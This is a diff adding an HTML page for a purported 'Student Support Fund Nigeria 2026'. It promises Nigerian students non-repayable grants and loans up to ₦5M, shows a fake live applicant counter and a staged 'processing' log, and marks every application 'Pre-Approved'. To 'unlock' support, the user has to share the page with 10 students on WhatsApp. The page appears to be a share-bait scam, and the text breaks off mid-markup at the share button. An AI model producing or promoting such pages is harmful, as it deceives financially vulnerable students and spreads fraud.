@@ -1,0 +1,817 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Student Support Fund Nigeria — 2026</title>
+<meta name="robots" content="noindex,nofollow">
+<link href="https://fonts.googleapis.com/css2?family=Canela+Deck:wght@400;700&family=Neue+Montreal:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,600;0,700;1,600;1,700&family=Outfit:wght@400;500;600;700;800;900&family=DM+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+:root {
+  --navy:  #0A1628;
+  --navy2: #0F1E38;
+  --navy3: #162540;
+  --blue:  #1565C0;
+  --blue2: #1976D2;
+  --sky:   #42A5F5;
+  --gold:  #F9A825;
+  --gold2: #FFD54F;
+  --green: #2E7D32;
+  --green2:#43A047;
+  --cream: #FFF8F0;
+  --w:     #FFFFFF;
+  --ink:   #0D1B2A;
+  --muted: #546E7A;
+  --red:   #C62828;
+  --wa:    #25D366;
+  --tg:    #2AABEE;
+}
+
+* { margin:0; padding:0; box-sizing:border-box; }
+html { scroll-behavior:smooth; }
+
+body {
+  font-family: 'Outfit', sans-serif;
+  background: var(--navy);
+  color: var(--w);
+  min-height: 100vh;
+  overflow-x: hidden;
+  -webkit-user-select: none;
+  user-select: none;
+}
+
+/* BG */
+.bg1 {
+  position:fixed; inset:0; z-index:0; pointer-events:none;
+  background:
+    radial-gradient(ellipse 100% 60% at 50% -5%, rgba(21,101,192,0.4) 0%, transparent 55%),
+    radial-gradient(ellipse 70% 50% at -5% 60%, rgba(21,101,192,0.15) 0%, transparent 50%),
+    radial-gradient(ellipse 60% 40% at 105% 80%, rgba(249,168,37,0.1) 0%, transparent 50%),
+    linear-gradient(180deg, #0A1628 0%, #070F1C 100%);
+}
+.bg2 {
+  position:fixed; inset:0; z-index:0; pointer-events:none;
+  background-image:
+    linear-gradient(rgba(21,101,192,0.06) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(21,101,192,0.06) 1px, transparent 1px);
+  background-size: 32px 32px;
+}
+.orb1 { position:fixed; width:600px; height:600px; border-radius:50%; top:-200px; left:-150px; z-index:0; pointer-events:none; background:rgba(21,101,192,0.2); filter:blur(90px); animation:o1 18s ease-in-out infinite alternate; }
+.orb2 { position:fixed; width:400px; height:400px; border-radius:50%; bottom:-100px; right:-100px; z-index:0; pointer-events:none; background:rgba(249,168,37,0.08); filter:blur(80px); animation:o2 14s ease-in-out infinite alternate; }
+@keyframes o1 { from{transform:translate(0,0)} to{transform:translate(40px,60px)} }
+@keyframes o2 { from{transform:translate(0,0)} to{transform:translate(-30px,-40px)} }
+
+/* LOCK */
+#lock { position:fixed; inset:0; background:#000; display:none; align-items:center; justify-content:center; flex-direction:column; gap:12px; z-index:99999; }
+#lock h2 { color:var(--red); font-size:18px; }
+#lock p  { color:#333; font-size:13px; }
+
+/* ANIMS */
+@keyframes rise    { from{transform:translateY(24px);opacity:0} to{transform:translateY(0);opacity:1} }
+@keyframes pop     { from{transform:scale(.3) rotate(-8deg);opacity:0} to{transform:scale(1) rotate(0);opacity:1} }
+@keyframes blink   { 0%,100%{opacity:1} 50%{opacity:.1} }
+@keyframes spin    { to{transform:rotate(360deg)} }
+@keyframes shimmer { from{background-position:-400px 0} to{background-position:400px 0} }
+@keyframes float   { 0%,100%{transform:translateY(0)} 50%{transform:translateY(-8px)} }
+@keyframes pulse   { 0%,100%{box-shadow:0 0 0 0 rgba(21,101,192,.4)} 70%{box-shadow:0 0 0 14px transparent} }
+@keyframes slideIn { from{transform:translateX(-14px);opacity:0} to{transform:translateX(0);opacity:1} }
+@keyframes shine   { 0%,100%{left:-60%} 50%{left:130%} }
+@keyframes tickS   { from{transform:translateX(0)} to{transform:translateX(-50%)} }
+@keyframes heartbeat { 0%,100%{transform:scale(1)} 50%{transform:scale(1.04)} }
+
+/* PAGE */
+.page { position:relative; z-index:1; max-width:480px; margin:0 auto; padding:0 14px 80px; }
+
+/* ══════════════════════
+   OFFICIAL HEADER
+══════════════════════ */
+.hdr {
+  position:relative; z-index:10;
+  background:linear-gradient(180deg, #0D47A1 0%, #0A3880 100%);
+  overflow:hidden;
+}
+.hdr-stripe {
+  height:5px;
+  background:linear-gradient(90deg, var(--gold), var(--gold2), #fff, var(--gold2), var(--gold));
+  background-size:400px 5px;
+  animation:shimmer 3s linear infinite;
+}
+.hdr-body {
+  display:flex; align-items:center; justify-content:space-between;
+  padding:14px 18px; gap:10px;
+}
+.hdr-left { display:flex; align-items:center; gap:12px; }
+.hdr-seal {
+  width:48px; height:48px; border-radius:50%;
+  background:linear-gradient(135deg, var(--gold), var(--gold2));
+  display:flex; align-items:center; justify-content:center;
+  font-size:26px; flex-shrink:0;
+  box-shadow:0 0 0 2px rgba(255,213,79,.4), 0 0 20px rgba(249,168,37,.3);
+}
+.hdr-t1 { font-size:10px; font-weight:600; color:rgba(255,255,255,.6); letter-spacing:2px; text-transform:uppercase; font-family:'DM Mono',monospace; }
+.hdr-t2 { font-size:15px; font-weight:800; color:#fff; }
+.hdr-right { text-align:right; }
+.hdr-live { display:flex; align-items:center; justify-content:flex-end; gap:6px; margin-bottom:2px; }
+.hdr-dot { width:7px; height:7px; border-radius:50%; background:var(--gold2); box-shadow:0 0 8px var(--gold2); animation:blink 1s infinite; }
+.hdr-ltxt { font-size:10px; font-weight:600; color:rgba(255,255,255,.5); font-family:'DM Mono',monospace; letter-spacing:1px; }
+.hdr-num  { font-size:18px; font-weight:800; color:var(--gold2); font-family:'DM Mono',monospace; }
+
+/* TICKER */
+.ticker { background:var(--gold); overflow:hidden; padding:8px 0; position:relative; z-index:9; }
+.ti { display:flex; white-space:nowrap; animation:tickS 22s linear infinite; }
+.ti span { font-size:11px; font-weight:800; letter-spacing:2px; text-transform:uppercase; color:#000; padding:0 26px; flex-shrink:0; font-family:'DM Mono',monospace; }
+.ti span::after { content:'★'; margin-left:26px; opacity:.3; }
+
+/* ══════════════════════
+   STEP 1 — LANDING
+══════════════════════ */
+#s1 { display:block; }
+
+/* Emotional hero */
+.hero { padding:24px 0 18px; animation:rise .5s ease both; }
+
+.hero-badge {
+  display:inline-flex; align-items:center; gap:8px;
+  background:rgba(21,101,192,.2); border:1px solid rgba(66,165,245,.3);
+  border-radius:8px; padding:7px 16px; margin-bottom:18px;
+}
+.hb-dot { width:8px; height:8px; border-radius:50%; background:var(--sky); animation:blink 1s infinite; box-shadow:0 0 8px var(--sky); }
+.hb-txt { font-size:11px; font-weight:700; letter-spacing:2px; text-transform:uppercase; color:var(--sky); font-family:'DM Mono',monospace; }
+
+.hero h1 {
+  font-family:'Cormorant Garamond', serif;
+  font-size:clamp(38px,10vw,56px);
+  font-weight:700; line-height:1.08;
+  margin-bottom:12px; color:var(--w);
+}
+.hero h1 em { font-style:italic; color:var(--gold2); }
+.hero h1 .sky { color:var(--sky); }
+
+.hero-emotion {
+  background:rgba(255,255,255,.04);
+  border:1px solid rgba(255,255,255,.08);
+  border-left:3px solid var(--gold);
+  border-radius:0 12px 12px 0;
+  padding:14px 16px; margin-bottom:18px;
+  font-size:14px; font-weight:600;
+  color:rgba(255,255,255,.75); line-height:1.7;
+  font-style:italic;
+}
+.hero-emotion span { color:var(--gold2); font-weight:800; font-style:normal; }
+
+/* Stats bar */
+.stats-bar {
+  display:grid; grid-template-columns:repeat(3,1fr);
+  gap:1px; background:rgba(255,255,255,.06);
+  border-radius:14px; overflow:hidden; margin-bottom:20px;
+}
+.sb { background:rgba(0,0,0,.3); padding:13px 6px; text-align:center; backdrop-filter:blur(8px); }
+.sb-v { font-family:'Cormorant Garamond',serif; font-size:26px; font-weight:700; color:var(--gold2); line-height:1; }
+.sb-l { font-size:10px; font-weight:700; color:rgba(255,255,255,.35); letter-spacing:.6px; text-transform:uppercase; margin-top:3px; font-family:'DM Mono',monospace; }
+
+/* WHAT DO YOU NEED MONEY FOR? — the emotional hook */
+.need-section { animation:rise .5s .08s ease both; }
+.need-title {
+  font-size:20px; font-weight:800; text-align:center;
+  margin-bottom:6px; color:var(--w);
+}
+.need-sub {
+  text-align:center; font-size:13px; color:rgba(255,255,255,.4);
+  font-weight:600; margin-bottom:18px; font-family:'DM Mono',monospace;
+}
+
+/* Support option cards — emotional, tappable */
+.options-grid { display:flex; flex-direction:column; gap:10px; margin-bottom:16px; }
+
+.opt-card {
+  display:flex; align-items:center; gap:14px;
+  background:rgba(255,255,255,.04);
+  border:1.5px solid rgba(255,255,255,.08);
+  border-radius:18px; padding:16px 18px;
+  cursor:pointer; transition:all .25s;
+  position:relative; overflow:hidden;
+  text-align:left; width:100%;
+}
+.opt-card::before {
+  content:''; position:absolute; top:0; left:0; right:0; height:2px;
+  background:var(--opt-color, var(--blue));
+  opacity:0; transition:opacity .25s;
+}
+.opt-card:hover { border-color:rgba(255,255,255,.2); background:rgba(255,255,255,.07); transform:translateX(4px); }
+.opt-card:hover::before { opacity:1; }
+.opt-card.selected { border-color:var(--opt-color, var(--blue)); background:rgba(255,255,255,.08); transform:translateX(4px); }
+.opt-card.selected::before { opacity:1; }
+
+.opt-icon-wrap {
+  width:52px; height:52px; border-radius:14px;
+  background:var(--opt-bg, rgba(21,101,192,.2));
+  display:flex; align-items:center; justify-content:center;
+  font-size:26px; flex-shrink:0;
+}
+.opt-body { flex:1; }
+.opt-title { font-size:15px; font-weight:800; color:var(--w); margin-bottom:3px; line-height:1.3; }
+.opt-desc  { font-size:12px; font-weight:600; color:rgba(255,255,255,.45); line-height:1.5; }
+.opt-amount {
+  font-family:'Cormorant Garamond',serif;
+  font-size:20px; font-weight:700;
+  color:var(--opt-color, var(--gold2));
+  flex-shrink:0; text-align:right;
+}
+.opt-amount small { display:block; font-size:10px; font-weight:600; color:rgba(255,255,255,.3); font-family:'DM Mono',monospace; letter-spacing:.5px; text-transform:uppercase; }
+
+.opt-card.selected .opt-check {
+  position:absolute; top:10px; right:12px;
+  width:20px; height:20px; border-radius:50%;
+  background:var(--opt-color, var(--blue));
+  display:flex; align-items:center; justify-content:center;
+  font-size:11px; color:#fff; font-weight:800;
+}
+
+/* Proceed button */
+.btn-proceed {
+  width:100%; padding:19px;
+  background:linear-gradient(135deg, var(--blue) 0%, var(--blue2) 100%);
+  color:#fff; border:none; border-radius:16px;
+  font-family:'Outfit',sans-serif; font-size:18px; font-weight:800;
+  cursor:pointer; margin-bottom:14px;
+  transition:transform .15s, box-shadow .15s;
+  box-shadow:0 8px 32px rgba(21,101,192,.4);
+  position:relative; overflow:hidden;
+  animation:pulse 2.5s ease-in-out infinite;
+  display:none;
+}
+.btn-proceed.show { display:block; }
+.btn-proceed::before { content:''; position:absolute; top:-50%; left:-60%; width:30%; height:200%; background:rgba(255,255,255,.2); transform:skewX(-20deg); animation:shine 3s ease-in-out infinite; }
+.btn-proceed:hover { transform:translateY(-2px); }
+.btn-proceed:active { transform:scale(.98); }
+
+.proceed-hint { text-align:center; font-size:11px; color:rgba(255,255,255,.25); font-family:'DM Mono',monospace; margin-bottom:16px; display:none; }
+.proceed-hint.show { display:block; }
+
+/* Soft disclaimer */
+.disclaimer {
+  background:rgba(255,255,255,.03);
+  border:1px solid rgba(255,255,255,.06);
+  border-radius:12px; padding:12px 14px;
+  font-size:12px; font-weight:600;
+  color:rgba(255,255,255,.3); line-height:1.6;
+  text-align:center;
+}
+.disclaimer strong { color:rgba(255,255,255,.5); }
+
+/* ══════════════════════
+   STEP 2 — PROCESSING
+══════════════════════ */
+#s2 { display:none; }
+.proc-wrap { padding:70px 20px; text-align:center; animation:rise .5s ease both; }
+.proc-ring {
+  width:100px; height:100px; border-radius:50%;
+  background:linear-gradient(135deg, var(--blue), var(--blue2));
+  margin:0 auto 28px;
+  display:flex; align-items:center; justify-content:center;
+  position:relative;
+  box-shadow:0 0 0 10px rgba(21,101,192,.1), 0 0 0 20px rgba(21,101,192,.05);
+}
+.proc-ring::before {
+  content:''; position:absolute; inset:-8px; border-radius:50%;
+  border:3px solid transparent;
+  border-top-color:var(--gold); border-right-color:var(--gold2);
+  animation:spin 1.2s linear infinite;
+}
+.proc-ring span { font-size:42px; }
+.proc-wrap h2 { font-family:'Cormorant Garamond',serif; font-size:30px; font-weight:700; margin-bottom:8px; color:var(--w); }
+.proc-wrap p  { font-size:13px; color:rgba(255,255,255,.4); line-height:1.7; margin-bottom:30px; font-family:'DM Mono',monospace; }
+.proc-selected {
+  display:inline-flex; align-items:center; gap:8px;
+  background:rgba(21,101,192,.2); border:1px solid rgba(66,165,245,.3);
+  border-radius:100px; padding:8px 16px; margin-bottom:24px;
+  font-size:14px; font-weight:700; color:var(--sky);
+}
+.plog { max-width:300px; margin:0 auto; display:flex; flex-direction:column; gap:10px; text-align:left; }
+.pl { display:flex; align-items:center; gap:10px; font-family:'DM Mono',monospace; font-size:12px; color:rgba(255,255,255,.2); transition:color .3s; }
+.pl.active { color:var(--w); }
+.pl.done   { color:var(--green2); }
+.pl-sq { width:7px; height:7px; border-radius:2px; background:rgba(21,101,192,.2); flex-shrink:0; transition:all .3s; }
+.pl.active .pl-sq { background:var(--gold2); box-shadow:0 0 8px var(--gold2); animation:blink .8s infinite; }
+.pl.done   .pl-sq { background:var(--green2); }
+
+/* ══════════════════════
+   STEP 3 — SHARE WALL
+══════════════════════ */
+#s3 { display:none; }
+
+.sw-hero { text-align:center; padding:26px 0 18px; animation:rise .5s ease both; }
+.sw-icon { font-size:60px; display:block; margin-bottom:12px; filter:drop-shadow(0 0 20px rgba(21,101,192,.5)); animation:float 3s ease-in-out infinite; }
+.sw-hero h2 { font-family:'Cormorant Garamond',serif; font-size:34px; font-weight:700; color:var(--gold2); margin-bottom:8px; }
+.sw-hero p  { font-size:14px; color:rgba(255,255,255,.5); line-height:1.8; max-width:320px; margin:0 auto; font-weight:500; }
+.sw-hero p strong { color:var(--w); }
+
+/* Application summary */
+.app-summary {
+  background:rgba(255,255,255,.04);
+  border:1px solid rgba(66,165,245,.2);
+  border-radius:16px; padding:18px 18px;
+  margin-bottom:18px;
+  animation:rise .5s .05s ease both;
+}
+.as-title { font-size:11px; font-weight:700; color:rgba(66,165,245,.5); letter-spacing:2px; text-transform:uppercase; font-family:'DM Mono',monospace; margin-bottom:12px; }
+.as-row { display:flex; justify-content:space-between; align-items:center; padding:8px 0; border-bottom:1px solid rgba(255,255,255,.05); }
+.as-row:last-child { border-bottom:none; padding-bottom:0; }
+.as-key { font-size:12px; color:rgba(255,255,255,.35); font-weight:600; }
+.as-val { font-size:14px; font-weight:800; color:var(--w); text-align:right; }
+.as-val.gold { color:var(--gold2); }
+.as-val.blue { color:var(--sky); }
+
+/* Progress */
+.prog-card {
+  background:rgba(0,0,0,.3);
+  border:1px solid rgba(66,165,245,.15);
+  border-radius:20px; padding:22px 18px; margin-bottom:14px;
+  backdrop-filter:blur(12px);
+  animation:rise .5s .1s ease both;
+}
+.prog-top { display:flex; justify-content:space-between; align-items:baseline; margin-bottom:10px; }
+.prog-lbl { font-size:10px; font-weight:700; color:rgba(66,165,245,.3); letter-spacing:2px; text-transform:uppercase; font-family:'DM Mono',monospace; }
+.prog-num { font-family:'Cormorant Garamond',serif; font-size:40px; font-weight:700; color:var(--gold2); line-height:1; }
+.prog-track { height:10px; background:rgba(0,0,0,.4); border-radius:100px; overflow:hidden; border:1px solid rgba(255,255,255,.06); margin-bottom:18px; }
+.prog-fill { height:100%; background:linear-gradient(90deg, var(--blue), var(--sky)); border-radius:100px; width:0%; transition:width .7s cubic-bezier(.34,1.56,.64,1); }
+
+.steps5 { display:grid; grid-template-columns:repeat(5,1fr); gap:7px; margin-bottom:20px; }
+.sn { aspect-ratio:1; border-radius:50%; background:rgba(0,0,0,.3); border:1.5px solid rgba(255,255,255,.07); display:flex; align-items:center; justify-content:center; font-size:13px; font-weight:700; color:rgba(255,255,255,.2); font-family:'DM Mono',monospace; transition:all .35s; position:relative; }
+.sn.done { background:rgba(21,101,192,.3); border-color:rgba(66,165,245,.4); }
+.sn.done::after { content:'✓'; position:absolute; inset:0; display:flex; align-items:center; justify-content:center; font-size:16px; color:var(--sky); }
+.sn.done span { display:none; }
+
+/* Share button */
+.btn-wa { width:100%; padding:18px; background:var(--wa); color:#fff; border:none; border-radius:15px; font-family:'Outfit',sans-serif; font-size:18px; font-weight:800; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:10px; transition:transform .15s, box-shadow .15s; box-shadow:0 8px 30px rgba(37,211,102,.35); margin-bottom:10px; position:relative; overflow:hidden; }
+.btn-wa::before { content:''; position:absolute; top:-50%; left:-60%; width:30%; height:200%; background:rgba(255,255,255,.2); transform:skewX(-20deg); animation:shine 4s ease-in-out infinite; }
+.btn-wa:hover { transform:translateY(-2px); box-shadow:0 12px 44px rgba(37,211,102,.5); }
+.btn-wa:active { transform:scale(.98); }
+
+.sw-hint { text-align:center; font-size:11px; color:rgba(255,255,255,.2); font-weight:600; margin-bottom:20px; font-family:'DM Mono',monospace; }
+
+.ghost { text-align:center; padding:4px 0 20px; color:#0A1628; font-size:12px; user-select:none; font-family:'DM Mono',monospace; }
+.ghost strong { color:#0A1628; }
+
+.tips { display:grid; grid-template-columns:1fr 1fr; gap:8px; margin-bottom:26px; }
+.tip { background:rgba(0,0,0,.2); border:1px solid rgba(255,255,255,.05); border-radius:10px; padding:10px; font-size:11px; font-weight:600; color:rgba(255,255,255,.25); line-height:1.6; text-align:center; }
+.tip .ti { font-size:16px; display:block; margin-bottom:4px; }
+
+/* Testimonials */
+.testi-hd { display:flex; align-items:center; gap:8px; margin-bottom:12px; }
+.td-dot { width:7px; height:7px; border-radius:50%; background:var(--green2); animation:blink 1.2s infinite; }
+.td-txt { font-size:10px; font-weight:700; color:rgba(255,255,255,.2); letter-spacing:2px; text-transform:uppercase; font-family:'DM Mono',monospace; }
+.tf { display:flex; flex-direction:column; gap:8px; max-height:300px; overflow:hidden; position:relative; }
+.tf::after { content:''; position:absolute; bottom:0; left:0; right:0; height:60px; background:linear-gradient(transparent, var(--navy)); pointer-events:none; }
+.tc { background:rgba(255,255,255,.03); border:1px solid rgba(255,255,255,.06); border-radius:13px; padding:13px; display:flex; align-items:flex-start; gap:10px; animation:slideIn .4s ease both; }
+.tc-av { width:32px; height:32px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:17px; flex-shrink:0; background:rgba(21,101,192,.2); }
+.tc-body { flex:1; }
+.tc-hd { font-size:13px; font-weight:700; margin-bottom:2px; display:flex; align-items:center; gap:6px; color:var(--w); }
+.tc-when { font-size:10px; color:rgba(255,255,255,.25); font-weight:500; font-family:'DM Mono',monospace; }
+.tc-msg { font-size:13px; color:rgba(255,255,255,.45); line-height:1.6; font-weight:500; }
+.tc-msg .ok { color:var(--green2); font-weight:700; }
+.tc-msg .hl { color:var(--gold2); font-weight:700; }
+
+/* ══════════════════════
+   STEP 4 — UNLOCK
+══════════════════════ */
+#s4 { display:none; }
+.unlock { min-height:100vh; display:flex; flex-direction:column; align-items:center; justify-content:center; padding:40px 0; text-align:center; }
+.unlock-halo { width:120px; height:120px; border-radius:50%; background:linear-gradient(135deg, var(--blue), var(--blue2)); display:flex; align-items:center; justify-content:center; margin:0 auto 20px; box-shadow:0 0 0 14px rgba(21,101,192,.1), 0 0 0 28px rgba(21,101,192,.05); animation:pulse 2s ease-in-out infinite; }
+.unlock-icon { font-size:56px; animation:pop .6s cubic-bezier(.34,1.56,.64,1) both; }
+.unlock h2 { font-family:'Cormorant Garamond',serif; font-size:44px; font-weight:700; color:var(--gold2); margin-bottom:8px; }
+.unlock p  { font-size:15px; color:rgba(255,255,255,.5); line-height:1.7; margin-bottom:30px; max-width:300px; font-weight:500; }
+.unlock p strong { color:var(--w); }
+
+.unlock-amount {
+  background:rgba(21,101,192,.15);
+  border:1px solid rgba(66,165,245,.25);
+  border-radius:16px; padding:18px 24px; margin-bottom:24px;
+  text-align:center;
+}
+.ua-label { font-size:11px; color:rgba(255,255,255,.4); font-family:'DM Mono',monospace; letter-spacing:1px; text-transform:uppercase; margin-bottom:6px; }
+.ua-amount { font-family:'Cormorant Garamond',serif; font-size:48px; font-weight:700; color:var(--gold2); line-height:1; text-shadow:0 0 30px rgba(249,168,37,.4); }
+.ua-type { font-size:13px; color:rgba(255,255,255,.4); font-weight:600; margin-top:4px; }
+
+.unlock-btns { display:flex; flex-direction:column; gap:10px; width:100%; margin-bottom:14px; }
+.btn-apply { display:block; width:100%; padding:20px; background:linear-gradient(135deg, var(--blue), var(--blue2)); color:#fff; border:none; border-radius:18px; font-family:'Outfit',sans-serif; font-size:18px; font-weight:800; cursor:pointer; text-decoration:none; text-align:center; box-shadow:0 10px 40px rgba(21,101,192,.45); animation:pulse 2s ease-in-out infinite; transition:transform .15s; position:relative; overflow:hidden; }
+.btn-apply::before { content:''; position:absolute; top:-50%; left:-60%; width:30%; height:200%; background:rgba(255,255,255,.2); transform:skewX(-20deg); animation:shine 2.5s ease-in-out infinite; }
+.btn-apply:hover { transform:translateY(-3px); }
+.btn-tg { display:flex; align-items:center; justify-content:center; gap:10px; width:100%; padding:15px; background:var(--tg); color:#fff; border:none; border-radius:15px; font-family:'Outfit',sans-serif; font-size:15px; font-weight:800; cursor:pointer; text-decoration:none; box-shadow:0 6px 24px rgba(42,171,238,.3); transition:transform .15s; }
+.btn-tg:hover { transform:translateY(-2px); }
+.un-note { font-size:11px; color:rgba(255,255,255,.15); font-family:'DM Mono',monospace; }
+
+.toast { position:fixed; bottom:22px; left:50%; transform:translateX(-50%) translateY(80px); background:var(--ink); border:1.5px solid var(--green2); color:var(--green2); padding:11px 22px; border-radius:100px; font-size:13px; font-weight:700; transition:transform .45s cubic-bezier(.34,1.56,.64,1); z-index:9999; white-space:nowrap; font-family:'DM Mono',monospace; }
+.toast.show { transform:translateX(-50%) translateY(0); }
+</style>
+</head>
+<body>
+
+<div class="bg1"></div>
+<div class="bg2"></div>
+<div class="orb1"></div>
+<div class="orb2"></div>
+
+<div id="lock">
+  <h2>⚠️ Unauthorized</h2>
+  <p>Only accessible at the official link.</p>
+</div>
+
+<!-- HEADER -->
+<div class="hdr">
+  <div class="hdr-stripe"></div>
+  <div class="hdr-body">
+    <div class="hdr-left">
+      <div class="hdr-seal">🎓</div>
+      <div>
+        <div class="hdr-t1">Student Support Portal · 2026</div>
+        <div class="hdr-t2">Nigeria Student Fund</div>
+      </div>
+    </div>
+    <div class="hdr-right">
+      <div class="hdr-live"><div class="hdr-dot"></div><div class="hdr-ltxt">STUDENTS ONLINE</div></div>
+      <div class="hdr-num" id="liveNum">47,291</div>
+    </div>
+  </div>
+</div>
+
+<!-- TICKER -->
+<div class="ticker">
+  <div class="ti">
+    <span>STUDENT SUPPORT FUND 2026 — APPLY NOW</span>
+    <span>SCHOOL FEES · UPKEEP · BUSINESS LOAN · STARTUP FUND</span>
+    <span>47,000+ STUDENTS ALREADY APPLIED TODAY</span>
+    <span>FREE · NO REPAYMENT FOR GRANTS · APPLY IN 2 MINUTES</span>
+    <span>STUDENT SUPPORT FUND 2026 — APPLY NOW</span>
+    <span>SCHOOL FEES · UPKEEP · BUSINESS LOAN · STARTUP FUND</span>
+    <span>47,000+ STUDENTS ALREADY APPLIED TODAY</span>
+    <span>FREE · NO REPAYMENT FOR GRANTS · APPLY IN 2 MINUTES</span>
+  </div>
+</div>
+
+<div class="page">
+
+<!-- ══ STEP 1 ══ -->
+<div id="s1">
+
+  <div class="hero">
+    <div class="hero-badge"><div class="hb-dot"></div><span class="hb-txt">2026 Student Fund — Applications Open</span></div>
+    <h1>
+      Are You a Student<br>
+      Who Needs <em>Financial</em><br>
+      <span class="sky">Support?</span>
+    </h1>
+    <div class="hero-emotion">
+      <span>"No student should drop out of school because of money."</span><br>
+      Select what you need below and get <span>matched instantly</span> — school fees, upkeep, business startup and more.
+    </div>
+  </div>
+
+  <div class="stats-bar">
+    <div class="sb"><div class="sb-v" id="stCnt">47K+</div><div class="sb-l">Applied</div></div>
+    <div class="sb"><div class="sb-v">₦5M</div><div class="sb-l">Max Loan</div></div>
+    <div class="sb"><div class="sb-v">Free</div><div class="sb-l">Grants</div></div>
+  </div>
+
+  <!-- EMOTIONAL OPTIONS — what do you need? -->
+  <div class="need-section">
+    <div class="need-title">What Do You Need Money For?</div>
+    <div class="need-sub">// tap the one that applies to you //</div>
+
+    <div class="options-grid">
+
+      <button class="opt-card" style="--opt-color:#42A5F5;--opt-bg:rgba(21,101,192,.2);" onclick="selectOpt(this,'School Fees','Up to ₦500,000','School Fees Support','🎓','₦500k')">
+        <div class="opt-icon-wrap">🎓</div>
+        <div class="opt-body">
+          <div class="opt-title">Pay My School Fees</div>
+          <div class="opt-desc">Don't let fees stop your education. Get up to ₦500,000 non-repayable support</div>
+        </div>
+        <div class="opt-amount">₦500k<small>GRANT</small></div>
+      </button>
+
+      <button class="opt-card" style="--opt-color:#66BB6A;--opt-bg:rgba(46,125,50,.2);" onclick="selectOpt(this,'Upkeep Money','₦20,000 – ₦100,000','Monthly Upkeep Support','🏠','₦20k–100k')">
+        <div class="opt-icon-wrap">🏠</div>
+        <div class="opt-body">
+          <div class="opt-title">Upkeep &amp; Living Money</div>
+          <div class="opt-desc">Feeding, rent, transport — monthly support from ₦20,000 to ₦100,000</div>
+        </div>
+        <div class="opt-amount">₦100k<small>GRANT</small></div>
+      </button>
+
+      <button class="opt-card" style="--opt-color:#FFA726;--opt-bg:rgba(230,81,0,.2);" onclick="selectOpt(this,'Business Startup Loan','Up to ₦5,000,000','Business Startup Loan','🚀','₦5M')">
+        <div class="opt-icon-wrap">🚀</div>
+        <div class="opt-body">
+          <div class="opt-title">Start a Business</div>
+          <div class="opt-desc">Serious about starting up? Apply for a student business loan up to ₦5,000,000</div>
+        </div>
+        <div class="opt-amount">₦5M<small>LOAN</small></div>
+      </button>
+
+      <button class="opt-card" style="--opt-color:#EF5350;--opt-bg:rgba(198,40,40,.2);" onclick="selectOpt(this,'Emergency Support','Up to ₦150,000','Emergency Student Aid','🆘','₦150k')">
+        <div class="opt-icon-wrap">🆘</div>
+        <div class="opt-body">
+          <div class="opt-title">Emergency Help</div>
+          <div class="opt-desc">Urgent situation? Medical, accommodation crisis — fast emergency support up to ₦150,000</div>
+        </div>
+        <div class="opt-amount">₦150k<small>GRANT</small></div>
+      </button>
+
+      <button class="opt-card" style="--opt-color:#AB47BC;--opt-bg:rgba(106,27,154,.2);" onclick="selectOpt(this,'Laptop & Study Tools','Up to ₦200,000','Tech & Study Support','💻','₦200k')">
+        <div class="opt-icon-wrap">💻</div>
+        <div class="opt-body">
+          <div class="opt-title">Laptop &amp; Study Tools</div>
+          <div class="opt-desc">Need a laptop or study materials? Get up to ₦200,000 to invest in your education</div>
+        </div>
+        <div class="opt-amount">₦200k<small>GRANT</small></div>
+      </button>
+
+      <button class="opt-card" style="--opt-color:#26C6DA;--opt-bg:rgba(0,96,100,.2);" onclick="selectOpt(this,'Project & Research Fund','Up to ₦300,000','Research Grant','📚','₦300k')">
+        <div class="opt-icon-wrap">📚</div>
+        <div class="opt-body">
+          <div class="opt-title">Project &amp; Research Fund</div>
+          <div class="opt-desc">Final year project, research, or internship costs covered — up to ₦300,000</div>
+        </div>
+        <div class="opt-amount">₦300k<small>GRANT</small></div>
+      </button>
+
+    </div>
+
+    <!-- Proceed button — shows after selection -->
+    <button class="btn-proceed" id="btnProceed" onclick="startProc()">
+      ✅ Proceed to Apply →
+    </button>
+    <p class="proceed-hint" id="procHint">// Your application will be processed instantly //</p>
+
+    <div class="disclaimer">
+      <strong>Student Support Fund Nigeria 2026</strong> · This fund supports Nigerian students through grants and verified loan schemes. Applications processed within 24hrs.
+    </div>
+  </div>
+
+</div><!-- /s1 -->
+
+<!-- ══ STEP 2 ══ -->
+<div id="s2">
+  <div class="proc-wrap">
+    <div class="proc-ring"><span>📋</span></div>
+    <h2>Processing Application...</h2>
+    <div class="proc-selected" id="procSelected">🎓 School Fees Support</div>
+    <p>Matching your request with available support funds. Please wait.</p>
+    <div class="plog">
+      <div class="pl" id="pl1"><div class="pl-sq"></div>VERIFY: checking student eligibility</div>
+      <div class="pl" id="pl2"><div class="pl-sq"></div>MATCH: finding available support fund</div>
+      <div class="pl" id="pl3"><div class="pl-sq"></div>CALC: computing support amount</div>
+      <div class="pl" id="pl4"><div class="pl-sq"></div>READY: preparing your application</div>
+    </div>
+  </div>
+</div>
+
+<!-- ══ STEP 3 ══ -->
+<div id="s3">
+
+  <div class="sw-hero">
+    <span class="sw-icon">📋</span>
+    <h2>Application Ready!</h2>
+    <p>Share this portal with <strong>10 students</strong> on WhatsApp to submit your application and unlock your support package.</p>
+  </div>
+
+  <!-- Application summary -->
+  <div class="app-summary">
+    <div class="as-title">// Your Application Summary //</div>
+    <div class="as-row"><span class="as-key">Support Type</span><span class="as-val blue" id="sumType">School Fees</span></div>
+    <div class="as-row"><span class="as-key">Amount</span><span class="as-val gold" id="sumAmount">₦500,000</span></div>
+    <div class="as-row"><span class="as-key">Status</span><span class="as-val" style="color:#66BB6A;">✓ Pre-Approved</span></div>
+    <div class="as-row"><span class="as-key">Ref. Number</span><span class="as-val" id="sumRef" style="font-family:'DM Mono',monospace;font-size:12px;">SSF-2026-——</span></div>
+  </div>
+
+  <div class="prog-card">
+    <div class="prog-top">
+      <span class="prog-lbl">Shares done</span>
+      <span class="prog-num" id="progNum">0/10</span>
+    </div>
+    <div class="prog-track"><div class="prog-fill" id="progFill"></div></div>
+    <div class="steps5" id="stepsG"></div>
+
+    <button class="btn-wa" onclick="doShare()">
